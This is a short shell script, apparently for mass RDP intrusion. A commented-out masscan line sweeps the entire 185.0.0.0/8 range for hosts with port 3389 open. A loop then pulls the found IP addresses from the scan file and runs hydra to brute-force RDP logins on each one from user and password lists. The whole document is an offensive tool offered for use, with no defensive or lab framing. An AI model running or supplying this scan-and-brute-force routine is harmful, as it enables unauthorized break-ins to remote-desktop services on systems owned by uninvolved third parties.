#sudo masscan --range 185.0.0.0-185.255.255.255 --rate 5000 -p3389 --open --banners -oG rdp.scan;
rm -rf hydra.log;
for i in `grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" rdp.scan`; do hydra -vv rdp://$i -L user -P pass -t1 -W1 -I >hydra.log;
done
